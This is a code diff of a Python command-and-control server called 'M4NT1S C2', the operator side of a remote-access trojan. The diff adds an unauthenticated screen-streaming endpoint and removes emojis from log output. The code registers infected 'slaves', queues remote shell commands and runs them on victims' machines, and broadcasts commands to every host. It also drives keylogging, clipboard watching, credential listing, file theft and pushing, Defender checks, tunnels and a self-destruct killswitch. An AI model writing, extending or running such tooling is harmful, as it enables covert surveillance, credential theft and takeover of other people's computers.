@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
 """
 M4NT1S C2 Server — Layer 0 (Console) / Layer 1 (Shell) / Layer 2 (Collect) / Layer 3 (Recon)
-- Layer 1 is a live shell: every line typed is sent to the selected slave as SHELL.
-- 'exit' in any sub-layer returns to Layer 0. 'EXIT' in Layer 0 shuts down.
-- slave_ids.json holds rich per-slave records (admin: yes/no) refreshed every poll.
-- X-C2-Token header auth (opt-in via C2_TOKEN env var)
+- Stream: frames POST to /api/v1/stream, GUI shows latest at wire rate
+- KILLSWITCH: agent self-terminates after posting its final result
 """
 
 import sqlite3
@@ -139,7 +137,7 @@ def db_conn():
     return sqlite3.connect(DB_FILE)
 
 # ---------------------------------------------------------------------------
-# IDS FILE (rich per-slave records)
+# IDS FILE
 # ---------------------------------------------------------------------------
 def load_ids():
     if not os.path.exists(ID_FILE):
@@ -166,8 +164,8 @@ def migrate_ids_file():
         return
     first_val = next(iter(data.values()))
     if isinstance(first_val, dict):
-        return  # already v2
-    print(f"  🔄 Migrating {ID_FILE} to v2 format...")
+        return
+    print(f"  Migrating {ID_FILE} to v2 format...")
     migrated = {}
     conn = db_conn()
     c = conn.cursor()
@@ -190,10 +188,9 @@ def migrate_ids_file():
         migrated[hostname] = rec
     conn.close()
     save_ids(migrated)
-    print(f"  ✅ Migrated {len(migrated)} entries")
+    print(f"  Migrated {len(migrated)} entries")
 
 def snapshot_slave_to_ids(numeric_id):
-    """Read slave row, upsert into slave_ids.json. Safe under ids_lock."""
     conn = db_conn()
     c = conn.cursor()
     c.execute("""SELECT hostname, is_admin, domain, os, kernel, last_seen, notes,
@@ -287,7 +284,7 @@ def parse_wifi_scan(netsh_output):
         networks.append(current)
     if not networks:
         return "No networks parsed."
-    out = [f"📶 {len(networks)} network(s) visible:"]
+    out = [f"{len(networks)} network(s) visible:"]
     for n in networks:
         out.append(f"  {n.get('ssid','?')}  sig={n.get('signal','?')}  ch={n.get('channel','?')}  bssid={n.get('bssid','?')}")
     return "\n".join(out)
@@ -303,6 +300,8 @@ def check_auth():
     if not request.path.startswith('/api/v1/'):
         return
     if request.path.startswith('/api/v1/image/'):
+        return
+    if request.path.startswith('/api/v1/stream'):
         return
     provided = request.headers.get('X-C2-Token', '')
     if provided != token:
@@ -346,7 +345,7 @@ def register():
                  1 if admin_val else 0, domain_val, numeric_id))
             conn.commit(); conn.close()
             snapshot_slave_to_ids(numeric_id)
-            log_queue.put(f"🔄 Re-registered slave ID {numeric_id:04d} ({hostname}) from {public_ip}")
+            log_queue.put(f"[RE-REG] slave ID {numeric_id:04d} ({hostname}) from {public_ip}")
             return jsonify({"numeric_id": numeric_id, "status": "ok"})
 
     c.execute("SELECT numeric_id FROM slaves WHERE hostname = ?", (hostname,))
@@ -362,7 +361,7 @@ def register():
             (public_ip, os_ver, kernel, now, 1 if admin_val else 0, domain_val, numeric_id))
         conn.commit(); conn.close()
         snapshot_slave_to_ids(numeric_id)
-        log_queue.put(f"🔄 Re-registered hostname '{hostname}' as ID {numeric_id:04d}")
+        log_queue.put(f"[RE-REG] hostname '{hostname}' as ID {numeric_id:04d}")
         return jsonify({"numeric_id": numeric_id, "status": "ok"})
 
     new_id = get_next_id()
@@ -373,7 +372,7 @@ def register():
          1 if admin_val else 0, domain_val))
     conn.commit(); conn.close()
     snapshot_slave_to_ids(new_id)
-    log_queue.put(f"✅ NEW SLAVE REGISTERED: ID {new_id:04d} ({hostname}) from {public_ip} admin={'yes' if admin_val else 'no'}")
+    log_queue.put(f"[NEW] slave ID {new_id:04d} ({hostname}) from {public_ip} admin={'yes' if admin_val else 'no'}")
     return jsonify({"numeric_id": new_id, "status": "ok"})
 
 @app.route('/api/v1/poll', methods=['POST'])
@@ -398,11 +397,10 @@ def poll():
         c.execute("UPDATE slaves SET domain = ? WHERE numeric_id = ?", (domain_val, numeric_id))
     conn.commit()
 
-    # refresh slave_ids.json on every poll
     try:
         snapshot_slave_to_ids(numeric_id)
     except Exception as e:
-        log_queue.put(f"⚠️ slave_ids.json update failed: {e}")
+        log_queue.put(f"[!] slave_ids.json update failed: {e}")
 
     c.execute("""SELECT id, command, payload FROM commands
         WHERE numeric_id = ? AND status = 'pending'
@@ -451,7 +449,7 @@ def result():
             image_queue.put((numeric_id, img_data))
             webbrowser.open(f"http://127.0.0.1:5000/api/v1/image/{task_id}")
         except Exception as e:
-            log_queue.put(f"❌ Error decoding image: {e}")
+            log_queue.put(f"[!] image decode: {e}")
         return jsonify({"status": "ok"})
 
     if output.startswith("FILE:"):
@@ -464,9 +462,9 @@ def result():
             fpath = f"uploads/task_{task_id}_{fname}"
             with open(fpath, 'wb') as f:
                 f.write(data_bytes)
-            session_log_queue.put(f"📎 File from ID {numeric_id:04d}: {fpath} ({len(data_bytes)} bytes)")
+            session_log_queue.put(f"[FILE] {fpath} ({len(data_bytes)} bytes) from ID {numeric_id:04d}")
         except Exception as e:
-            log_queue.put(f"❌ File decode error: {e}")
+            log_queue.put(f"[!] file decode: {e}")
         return jsonify({"status": "ok"})
 
     if command == 'STATUS':
@@ -513,7 +511,7 @@ def result():
                       (kind, port, numeric_id))
             conn.commit(); conn.close()
             snapshot_slave_to_ids(numeric_id)
-            session_log_queue.put(f"🔒 Tunnel up on ID {numeric_id:04d}: {kind} remote_port={port}")
+            session_log_queue.put(f"[TUNNEL] up: ID {numeric_id:04d} {kind} :{port}")
 
     if command == 'TUNNEL_STOP':
         conn = db_conn(); c = conn.cursor()
@@ -523,15 +521,27 @@ def result():
         c.execute("UPDATE slaves SET tunnel_kind = NULL, tunnel_port = NULL WHERE numeric_id = ?", (numeric_id,))
         conn.commit(); conn.close()
         snapshot_slave_to_ids(numeric_id)
-        session_log_queue.put(f"🔓 Tunnel stopped on ID {numeric_id:04d}")
+        session_log_queue.put(f"[TUNNEL] down: ID {numeric_id:04d}")
 
     if output and not output.startswith("ERROR:"):
-        log_queue.put(f"📤 Task {task_id} [{command}] on ID {numeric_id:04d}:\n{output}")
+        log_queue.put(f"[{command}] ID {numeric_id:04d}:\n{output}")
     elif output.startswith("ERROR:"):
-        log_queue.put(f"❌ Task {task_id} [{command}]: {output}")
+        log_queue.put(f"[{command}] ID {numeric_id:04d} -> {output}")
     else:
-        log_queue.put(f"📥 Task {task_id} [{command}] finished: {status}")
+        log_queue.put(f"[{command}] ID {numeric_id:04d} finished ({status})")
     return jsonify({"status": "ok"})
+
+@app.route('/api/v1/stream', methods=['POST'])
+def stream():
+    data = request.get_json()
+    if not data or 'frame' not in data or 'id' not in data:
+        return jsonify({"error": "missing fields"}), 400
+    try:
+        img_data = base64.b64decode(data['frame'])
+        image_queue.put((data['id'], img_data))
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 400
 
 @app.route('/api/v1/image/<int:task_id>')
 def serve_image(task_id):
@@ -551,15 +561,15 @@ def upload():
     os.makedirs('uploads', exist_ok=True)
     filepath = f"uploads/task_{task_id}_{file.filename}"
     file.save(filepath)
-    log_queue.put(f"📤 Upload for task {task_id}: {filepath}")
+    log_queue.put(f"[UPLOAD] {filepath}")
     return jsonify({"status": "ok"})
 
 # ---------------------------------------------------------------------------
 # LAYER 1 — SHELL
 # ---------------------------------------------------------------------------
 def layer_1_shell(numeric_id):
-    print(f"\n  💻 LAYER 1 [SHELL] – ID {numeric_id:04d}. Type 'exit' to return.\n")
-    print("  Every line you type runs on the slave as `cmd /c <line>`.\n")
+    print(f"\n  LAYER 1 [SHELL] - ID {numeric_id:04d}. Type 'exit' to return.\n")
+    print("  Every line runs on the slave as `cmd /c <line>`.\n")
 
     while True:
         try:
@@ -570,33 +580,30 @@ def layer_1_shell(numeric_id):
 
         line = console_input_queue.get()
         if line is None:
-            print("\n  🔙 Console input closed. Returning to Layer 0.\n")
+            print("\n  Console input closed. Returning to Layer 0.\n")
             return
         line = line.rstrip('\n').rstrip('\r')
         if not line.strip():
             continue
         if line.strip().lower() == "exit":
-            print("\n  🔙 Returning to Layer 0.\n")
+            print("\n  Returning to Layer 0.\n")
             return
-        if line.strip().lower() == "clear":
-            print("\n" * 40)
-            continue
 
         tid = queue_command(numeric_id, "SHELL", {"cmd": line})
         if not tid:
-            print(f"  ❌ Slave ID {numeric_id:04d} not found. Returning to Layer 0.\n")
+            print(f"  Slave ID {numeric_id:04d} not found.\n")
             return
         out = wait_result(tid, timeout=20)
         if out:
             print(out.rstrip())
         else:
-            print("  [no response — slave may be offline]")
+            print("  [no response]")
 
 # ---------------------------------------------------------------------------
 # LAYER 2 — COLLECT
 # ---------------------------------------------------------------------------
 def layer_2_collect(numeric_id):
-    print(f"\n  📦 LAYER 2 [COLLECT] – ID {numeric_id:04d}. Type 'exit' to return.\n")
+    print(f"\n  LAYER 2 [COLLECT] - ID {numeric_id:04d}. Type 'exit' to return.\n")
     print("  Commands:")
     print("    stream start [interval_ms] | stream stop")
     print("    keylog start | keylog stop | keylog pull")
@@ -617,8 +624,8 @@ def layer_2_collect(numeric_id):
         line = line.strip()
         if not line:
             continue
-        if line.lower() == "exit" or line == "BREAK":
-            print("\n  🔙 Returning to Layer 0.\n")
+        if line.lower() == "exit":
+            print("\n  Returning to Layer 0.\n")
             return
 
         parts = line.split()
@@ -627,35 +634,40 @@ def layer_2_collect(numeric_id):
         if cmd == "stream" and len(parts) >= 2:
             sub = parts[1].lower()
             if sub == "start":
-                interval = 1000
+                interval = 500
                 if len(parts) > 2:
                     try:
                         interval = int(parts[2])
                     except ValueError:
                         pass
-                queue_command(numeric_id, "SCREEN_STREAM_START", {"interval_ms": interval})
-                print(f"  ▶️  Stream requested (interval {interval} ms).")
+                tid = queue_command(numeric_id, "SCREEN_STREAM_START", {"interval_ms": interval})
+                if not tid:
+                    print(f"  Slave ID {numeric_id:04d} not found.")
+                    continue
+                out = wait_result(tid, timeout=5)
+                print(f"  {out or '[no response]'}")
             elif sub == "stop":
-                queue_command(numeric_id, "SCREEN_STREAM_STOP")
-                print("  ⏹  Stream stop requested.")
+                tid = queue_command(numeric_id, "SCREEN_STREAM_STOP")
+                out = wait_result(tid, timeout=5)
+                print(f"  {out or '[no response]'}")
             else:
-                print("  ❌ stream start|stop")
+                print("  stream start|stop")
             continue
 
         if cmd == "keylog":
             if len(parts) < 2:
-                print("  ❌ keylog start|stop|pull"); continue
+                print("  keylog start|stop|pull"); continue
             sub = parts[1].lower()
             if sub == "start":
-                queue_command(numeric_id, "KEYLOG_START"); print("  ▶️  Keylog start requested.")
+                queue_command(numeric_id, "KEYLOG_START"); print("  Keylog start requested.")
             elif sub == "stop":
-                queue_command(numeric_id, "KEYLOG_STOP"); print("  ⏹  Keylog stop requested.")
+                queue_command(numeric_id, "KEYLOG_STOP"); print("  Keylog stop requested.")
             elif sub == "pull":
                 tid = queue_command(numeric_id, "KEYLOG_PULL")
                 out = wait_result(tid, 8)
                 print(f"  {out or '[no buffer]'}")
             else:
-                print("  ❌ keylog start|stop|pull")
+                print("  keylog start|stop|pull")
             continue
 
         if cmd == "file" and len(parts) >= 2:
@@ -663,10 +675,10 @@ def layer_2_collect(numeric_id):
             if sub == "pull" and len(parts) >= 3:
                 path = " ".join(parts[2:])
                 tid = queue_command(numeric_id, "FILE_PULL", {"path": path})
-                print(f"  ⏳ Pulling {path}...")
+                print(f"  Pulling {path}...")
                 out = wait_result(tid, 20)
                 if out and out.startswith("FILE:"):
-                    print("  ✅ File received; see Session Logs / uploads/")
+                    print("  File received; see Session Logs / uploads/")
                 else:
                     print(f"  {out or '[no response]'}")
             elif sub == "push" and len(parts) >= 4:
@@ -675,7 +687,7 @@ def layer_2_collect(numeric_id):
                 tid = queue_command(numeric_id, "FILE_PUSH", {"path": path, "data_b64": b64})
                 print(f"  {wait_result(tid, 10) or '[no response]'}")
             else:
-                print("  ❌ file pull <path> | file push <path> <b64>")
+                print("  file pull <path> | file push <path> <b64>")
             continue
 
         if cmd == "creds":
@@ -692,7 +704,7 @@ def layer_2_collect(numeric_id):
 
         if cmd == "clip":
             if len(parts) < 2:
-                print("  ❌ clip watch [interval_ms] | clip stop"); continue
+                print("  clip watch [interval_ms] | clip stop"); continue
             sub = parts[1].lower()
             if sub == "watch":
                 interval = 2000
@@ -702,24 +714,24 @@ def layer_2_collect(numeric_id):
                     except ValueError:
                         pass
                 queue_command(numeric_id, "CLIPBOARD_WATCH_START", {"interval_ms": interval})
-                print(f"  ▶️  Clipboard watch started ({interval} ms).")
+                print(f"  Clipboard watch started ({interval} ms).")
             elif sub == "stop":
                 queue_command(numeric_id, "CLIPBOARD_WATCH_STOP")
-                print("  ⏹  Clipboard watch stopped.")
+                print("  Clipboard watch stopped.")
             else:
-                print("  ❌ clip watch|stop")
+                print("  clip watch|stop")
             continue
 
-        print(f"  ❌ Unknown: {line}")
+        print(f"  Unknown: {line}")
 
 # ---------------------------------------------------------------------------
 # LAYER 3 — RECON
 # ---------------------------------------------------------------------------
 def layer_3_recon(numeric_id):
-    print(f"\n  🛰️  LAYER 3 [RECON] – ID {numeric_id:04d}. Type 'exit' to return.\n")
+    print(f"\n  LAYER 3 [RECON] - ID {numeric_id:04d}. Type 'exit' to return.\n")
     print("  Commands:")
     print("    processes | network | dns | defender | tasks | cleanup")
-    print("    triangulate     – Wi-Fi scan (netsh parse)\n")
+    print("    triangulate     - Wi-Fi scan (netsh parse)\n")
 
     one_shots = {
         "processes":   ("PROCESSES", 12),
@@ -744,8 +756,8 @@ def layer_3_recon(numeric_id):
         line = line.strip()
         if not line:
             continue
-        if line.lower() == "exit" or line == "BREAK":
-            print("\n  🔙 Returning to Layer 0.\n")
+        if line.lower() == "exit":
+            print("\n  Returning to Layer 0.\n")
             return
 
         cmd = line.split()[0].lower()
@@ -753,7 +765,7 @@ def layer_3_recon(numeric_id):
             agent_cmd, timeout = one_shots[cmd]
             tid = queue_command(numeric_id, agent_cmd)
             if not tid:
-                print(f"  ❌ Slave ID {numeric_id:04d} not found.")
+                print(f"  Slave ID {numeric_id:04d} not found.")
                 continue
             out = wait_result(tid, timeout)
             if cmd == "triangulate" and out:
@@ -762,17 +774,17 @@ def layer_3_recon(numeric_id):
                 print(f"\n{out if out else '[no response]'}\n")
             continue
 
-        print(f"  ❌ Unknown: {line}")
+        print(f"  Unknown: {line}")
 
 # ---------------------------------------------------------------------------
 # LAYER 0 — CONSOLE
 # ---------------------------------------------------------------------------
 def layer_0():
-    print("\n  ╔══════════════════════════════════════════════════════╗")
-    print("  ║      🎯  M4NT1S C2 — LAYER 0 [CONSOLE]            ║")
-    print("  ╚══════════════════════════════════════════════════════╝\n")
-    print("  📡 Listening on http://0.0.0.0:5000")
-    print("  🔐 Auth: " + ("X-C2-Token required" if os.environ.get('C2_TOKEN') else "disabled (set C2_TOKEN env to enable)"))
+    print("\n  ======================================================")
+    print("      M4NT1S C2 - LAYER 0 [CONSOLE]")
+    print("  ======================================================\n")
+    print("  Listening on http://0.0.0.0:5000")
+    print("  Auth: " + ("X-C2-Token required" if os.environ.get('C2_TOKEN') else "disabled"))
     print("")
     print("  One-shots:")
     print("     <id> shell <cmd>       run cmd /c <cmd>")
@@ -783,13 +795,13 @@ def layer_0():
     print("     <id> locate            Wi-Fi scan")
     print("")
     print("  Layers (each accepts 'exit' to return):")
-    print("     <id> enter shell       live shell — every typed line runs on that ID")
-    print("     <id> enter collect     screenshots, keylog, files, creds")
+    print("     <id> enter shell       live shell")
+    print("     <id> enter collect     stream, keylog, files, creds")
     print("     <id> enter recon       processes, network, defender, tasks")
     print("")
     print("  Cross-cutting:")
     print("     broadcast <cmd>        run same command on all active slaves")
-    print("     KILLSWITCH             clear pending + self-destruct all active")
+    print("     KILLSWITCH             self-destruct all active slaves")
     print("     EXIT                   shutdown\n")
 
     while True:
@@ -805,31 +817,29 @@ def layer_0():
         line = line.strip()
         if not line:
             continue
-        if line == "BREAK":
-            continue
-        if line == "EXIT" or line.lower() == "exit":
-            print("\n  👋 Shutting down C2 server.\n")
+        if line.upper() == "EXIT" or line.lower() == "exit":
+            print("\n  Shutting down C2 server.\n")
             os._exit(0)
 
-        if line == "KILLSWITCH":
+        if line.upper() == "KILLSWITCH":
             cancelled = clear_pending()
             if cancelled:
-                session_log_queue.put(f"🛑 Cancelled {cancelled} pending command(s) before killswitch.")
+                session_log_queue.put(f"[!] Cancelled {cancelled} pending command(s) before killswitch.")
             conn = db_conn(); c = conn.cursor()
             c.execute("SELECT numeric_id FROM slaves WHERE status = 'active'")
             rows = c.fetchall()
             if not rows:
-                print("  ❌ No active slaves."); conn.close(); continue
+                print("  No active slaves."); conn.close(); continue
             for (sid,) in rows:
                 c.execute("INSERT INTO commands (numeric_id, command) VALUES (?, 'KILLSWITCH')", (sid,))
             conn.commit(); conn.close()
-            print(f"  📡 KILLSWITCH sent to {len(rows)} active slaves.")
+            print(f"  KILLSWITCH sent to {len(rows)} active slaves.")
             continue
 
         parts = line.split()
         if parts[0] == "broadcast":
             if len(parts) < 3:
-                print("  ❌ Usage: broadcast <command> [args...]")
+                print("  Usage: broadcast <command> [args...]")
                 continue
             cmd = parts[1].upper()
             payload = None
@@ -839,19 +849,19 @@ def layer_0():
             c.execute("SELECT numeric_id FROM slaves WHERE status = 'active'")
             rows = c.fetchall(); conn.close()
             if not rows:
-                print("  ❌ No active slaves."); continue
+                print("  No active slaves."); continue
             for (sid,) in rows:
                 queue_command(sid, cmd, payload)
-            print(f"  📡 Broadcast '{cmd}' queued for {len(rows)} active slaves.")
+            print(f"  Broadcast '{cmd}' queued for {len(rows)} active slaves.")
             continue
 
         if len(parts) < 2:
-            print("  ❌ Usage: <id> <command> ...")
+            print("  Usage: <id> <command> ...")
             continue
 
         raw_id = parts[0]
         if not raw_id.isdigit():
-            print("  ❌ ID must be numeric (e.g. 0001)")
+            print("  ID must be numeric (e.g. 0001)")
             continue
         numeric_id = int(raw_id)
         command = parts[1].lower()
@@ -859,7 +869,7 @@ def layer_0():
         conn = db_conn(); c = conn.cursor()
         c.execute("SELECT 1 FROM slaves WHERE numeric_id = ?", (numeric_id,))
         if not c.fetchone():
-            print(f"  ❌ Slave ID {numeric_id:04d} not found.")
+            print(f"  Slave ID {numeric_id:04d} not found.")
             conn.close(); continue
         conn.close()
 
@@ -872,22 +882,30 @@ def layer_0():
             elif sub == "recon":
                 layer_3_recon(numeric_id)
             else:
-                print(f"  ❌ Unknown layer: {sub}  (shell | collect | recon)")
+                print(f"  Unknown layer: {sub}  (shell | collect | recon)")
             continue
 
         if command == "locate":
             tid = queue_command(numeric_id, "TRIANGULATE")
-            print(f"  ⏳ Scanning Wi-Fi on ID {numeric_id:04d}...")
+            print(f"  Scanning Wi-Fi on ID {numeric_id:04d}...")
             out = wait_result(tid, 20)
             if out:
                 print(f"\n{parse_wifi_scan(out)}\n")
             else:
-                print("  ❌ Timeout waiting for scan.")
+                print("  Timeout waiting for scan.")
             continue
 
         if command == "screenshot":
-            queue_command(numeric_id, "SCREEN_CAPTURE")
-            print(f"  ✅ Screenshot requested for ID {numeric_id:04d}.")
+            tid = queue_command(numeric_id, "SCREEN_CAPTURE")
+            out = wait_result(tid, 8)
+            if out and out.startswith("ERROR:"):
+                print(f"  {out}")
+            elif out and out.startswith("IMAGE:"):
+                print(f"  Screenshot captured (browser tab opening).")
+            elif out:
+                print(f"  {out[:200]}")
+            else:
+                print("  [no response]")
             continue
 
         if command == "status":
@@ -910,7 +928,7 @@ def layer_0():
 
         if command == "shell":
             if len(parts) < 3:
-                print("  ❌ Usage: <id> shell <command>")
+                print("  Usage: <id> shell <command>")
                 continue
             cmd_str = " ".join(parts[2:])
             tid = queue_command(numeric_id, "SHELL", {"cmd": cmd_str})
@@ -918,14 +936,14 @@ def layer_0():
             print(f"\n{out if out else '[no response]'}\n")
             continue
 
-        print(f"  ❌ Unknown command: {command}")
+        print(f"  Unknown command: {command}")
 
 # ---------------------------------------------------------------------------
 # GUI
 # ---------------------------------------------------------------------------
 def run_gui():
     root = tk.Tk()
-    root.title("M4NT1S C2 — Slave Monitor")
+    root.title("M4NT1S C2 - Slave Monitor")
     root.geometry("960x720")
     root.configure(bg="#1e1e1e")
 
@@ -985,7 +1003,7 @@ def run_gui():
     for i, (label_text, _) in enumerate(info_data):
         tk.Label(info_frame, text=f"{label_text}:", bg=FRAME_BG, fg=DIM_TEXT,
                  font=("Segoe UI", 9, "bold"), anchor="e").grid(row=i, column=0, sticky="e", padx=(10, 5), pady=3)
-        val = tk.Label(info_frame, text="—", bg=FRAME_BG, fg=TEXT_COLOR,
+        val = tk.Label(info_frame, text="-", bg=FRAME_BG, fg=TEXT_COLOR,
                        font=("Consolas", 9), anchor="w", wraplength=500, justify="left")
         val.grid(row=i, column=1, sticky="w", padx=(0, 10), pady=3)
         info_labels[info_data[i][1]] = val
@@ -1000,7 +1018,7 @@ def run_gui():
 
     def update_info_pane(data):
         for key, label in info_labels.items():
-            label.config(text=data.get(key, "—"))
+            label.config(text=data.get(key, "-"))
         is_online = False
         last_seen = data.get("last_seen")
         if last_seen:
@@ -1026,15 +1044,18 @@ def run_gui():
             image_label.config(image=photo)
             image_label.image = photo
             image_label.img_data = img_data
-            info_frame.pack_forget()
-            image_frame.pack(fill=tk.BOTH, expand=True)
-            image_label.pack(fill=tk.BOTH, expand=True)
+            # Only re-layout on transition, otherwise stream frames flicker
+            if not image_frame.winfo_ismapped():
+                info_frame.pack_forget()
+                image_frame.pack(fill=tk.BOTH, expand=True)
+                image_label.pack(fill=tk.BOTH, expand=True)
         except Exception as e:
-            log_queue.put(f"❌ Error displaying image: {e}")
+            log_queue.put(f"[!] image display: {e}")
 
     def hide_image():
-        image_frame.pack_forget()
-        info_frame.pack(fill=tk.BOTH, expand=True)
+        if image_frame.winfo_ismapped():
+            image_frame.pack_forget()
+            info_frame.pack(fill=tk.BOTH, expand=True)
 
     def on_left_click(event):
         try:
@@ -1051,19 +1072,19 @@ def run_gui():
             row = c.fetchone(); conn.close()
             if not row:
                 return
-            tunnel = "—"
+            tunnel = "-"
             if row[9]:
                 tunnel = f"{row[9]} (port {row[10] or '?'})"
             data = {
                 "numeric_id": f"{row[0]:04d}",
-                "hostname":   row[1] or "—",
-                "public_ip":  row[2] or "—",
-                "os":         row[3] or "—",
-                "kernel":     row[4] or "—",
-                "domain":     row[7] or "—",
+                "hostname":   row[1] or "-",
+                "public_ip":  row[2] or "-",
+                "os":         row[3] or "-",
+                "kernel":     row[4] or "-",
+                "domain":     row[7] or "-",
                 "is_admin":   "yes" if row[8] else "no",
                 "tunnel":     tunnel,
-                "last_cmd":   row[11] or "—",
+                "last_cmd":   row[11] or "-",
                 "notes":      row[12] or "",
                 "last_seen":  row[5],
                 "status":     row[6],
@@ -1106,7 +1127,7 @@ def run_gui():
                 status_bar.config(text=f"Copied ID: {num_id:04d}", fg=ONLINE)
                 root.after(2000, lambda: status_bar.config(text="Ready", fg=DIM_TEXT))
             m.add_command(label="Copy ID", command=copy_id)
-            m.add_command(label="Notes…", command=lambda: edit_notes(num_id))
+            m.add_command(label="Notes...", command=lambda: edit_notes(num_id))
             m.add_separator()
             m.add_command(label="Queue: Screenshot",  command=lambda: queue_command(num_id, "SCREEN_CAPTURE"))
             m.add_command(label="Queue: Status",      command=lambda: queue_command(num_id, "STATUS"))
@@ -1152,12 +1173,12 @@ def run_gui():
     bottom_container = tk.Frame(root, bg=BG)
     bottom_container.pack(fill=tk.X, padx=10, pady=(0, 10))
 
-    def build_log_panel(parent, label_text, log_q):
+    def build_log_panel(parent, label_text):
         frame = tk.Frame(parent, bg=FRAME_BG, highlightbackground=BORDER, highlightthickness=1)
         frame.pack(fill=tk.X, pady=(0, 2))
         toggle = tk.Frame(frame, bg=FRAME_BG, cursor="hand2")
         toggle.pack(fill=tk.X, padx=5, pady=5)
-        arrow = tk.Label(toggle, text="▼", bg=FRAME_BG, fg=TEXT_COLOR, font=("Segoe UI", 10, "bold"))
+        arrow = tk.Label(toggle, text="v", bg=FRAME_BG, fg=TEXT_COLOR, font=("Segoe UI", 10, "bold"))
         arrow.pack(side=tk.LEFT, padx=(0, 5))
         lbl = tk.Label(toggle, text=label_text, bg=FRAME_BG, fg=DIM_TEXT, font=("Segoe UI", 10))
         lbl.pack(side=tk.LEFT)
@@ -1172,16 +1193,16 @@ def run_gui():
         state = {'visible': True}
         def toggle_fn(_=None):
             if state['visible']:
-                cont.pack_forget(); arrow.config(text="▶"); state['visible'] = False
+                cont.pack_forget(); arrow.config(text=">"); state['visible'] = False
             else:
                 cont.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-                arrow.config(text="▼"); state['visible'] = True
+                arrow.config(text="v"); state['visible'] = True
         for w in (toggle, arrow, lbl):
             w.bind("<Button-1>", toggle_fn)
         return txt
 
-    ddos_like_text = build_log_panel(bottom_container, "Session Logs", session_log_queue)
-    cmd_log_text   = build_log_panel(bottom_container, "Command Pool", log_queue)
+    ddos_like_text = build_log_panel(bottom_container, "Session Logs")
+    cmd_log_text   = build_log_panel(bottom_container, "Command Pool")
 
     status_bar = tk.Label(root, text="Ready", bg=BG, fg=DIM_TEXT, font=("Segoe UI", 9), anchor="w")
     status_bar.pack(fill=tk.X, padx=10, pady=(0, 10))
@@ -1204,9 +1225,9 @@ def run_gui():
                         online = True
                 except Exception:
                     pass
-            icon = "●"
-            tstr = f" 🔒{tunnel_kind}" if tunnel_kind else ""
-            astr = " ⚡" if is_admin else ""
+            icon = "*"
+            tstr = f" [{tunnel_kind}]" if tunnel_kind else ""
+            astr = " [ADMIN]" if is_admin else ""
             display = f"{icon} ID: {num_id:04d} | {hostname}{astr}{tstr}"
             listbox.insert(tk.END, display)
             listbox.itemconfig(tk.END, {'fg': ONLINE if online else OFFLINE})
@@ -1232,11 +1253,17 @@ def run_gui():
                 ddos_like_text.insert(tk.END, msg + "\n"); ddos_like_text.see(tk.END)
         except queue.Empty:
             pass
+        # Drain image queue to only show latest frame (streams produce many)
         try:
+            latest = None
             while True:
-                _, img_data = image_queue.get_nowait()
-                show_image(img_data)
-        except queue.Empty:
+                try:
+                    latest = image_queue.get_nowait()
+                except queue.Empty:
+                    break
+            if latest:
+                show_image(latest[1])
+        except Exception:
             pass
         root.after(100, process_queues)
 
@@ -1256,7 +1283,7 @@ def client_mode():
 
     raw_id = sys.argv[1]
     if not raw_id.isdigit():
-        print("  ❌ ID must be numeric."); sys.exit(1)
+        print("  ID must be numeric."); sys.exit(1)
     numeric_id = int(raw_id)
     command = sys.argv[2].upper()
     payload = None
@@ -1273,30 +1300,31 @@ def client_mode():
     try:
         requests.get(f"{SERVER_URL}/api/v1/image/0", timeout=1, headers=headers)
     except requests.exceptions.ConnectionError:
-        print("  ❌ C2 server not running.")
+        print("  C2 server not running.")
         sys.exit(1)
 
     conn = db_conn(); c = conn.cursor()
     c.execute("SELECT 1 FROM slaves WHERE numeric_id = ?", (numeric_id,))
     if not c.fetchone():
-        print(f"  ❌ Slave ID {numeric_id:04d} not found.")
+        print(f"  Slave ID {numeric_id:04d} not found.")
         conn.close(); sys.exit(1)
     conn.close()
 
     allowed = {"STATUS", "SYSINFO", "SHELL", "SCREEN_CAPTURE", "TRIANGULATE",
                "CLIPBOARD_GET", "PROCESSES", "NETWORK_INFO", "DNS_CACHE",
                "DEFENDER_CHECK", "PERSIST_LIST", "TASK_CLEANUP", "KILLSWITCH",
-               "FILE_PULL", "CRED_LIST"}
+               "FILE_PULL", "CRED_LIST",
+               "SCREEN_STREAM_START", "SCREEN_STREAM_STOP"}
     if command not in allowed:
-        print(f"  ❌ '{command}' not supported from CLI. Use the interactive shell.")
+        print(f"  '{command}' not supported from CLI.")
         sys.exit(1)
 
     tid = queue_command(numeric_id, command, payload)
     if tid:
-        print(f"  ✅ '{command}' queued for ID {numeric_id:04d} (task {tid})")
+        print(f"  '{command}' queued for ID {numeric_id:04d} (task {tid})")
 
 # ---------------------------------------------------------------------------
-# FLASK THREAD
+# RUNNERS
 # ---------------------------------------------------------------------------
 def run_flask():
     cli = sys.modules.get('flask.cli')
@@ -1304,9 +1332,6 @@ def run_flask():
         cli.show_server_banner = lambda *args: None
     app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
 
-# ---------------------------------------------------------------------------
-# STDIN READER
-# ---------------------------------------------------------------------------
 def stdin_reader():
     try:
         for line in sys.stdin:
@@ -1315,9 +1340,6 @@ def stdin_reader():
         pass
     console_input_queue.put(None)
 
-# ---------------------------------------------------------------------------
-# MAIN
-# ---------------------------------------------------------------------------
 if __name__ == '__main__':
     init_db()
     migrate_ids_file()
@@ -1343,5 +1365,5 @@ if __name__ == '__main__':
     try:
         run_gui()
     except KeyboardInterrupt:
-        print("\n  👋 Goodbye.\n")
+        print("\n  Goodbye.\n")
         sys.exit(0)
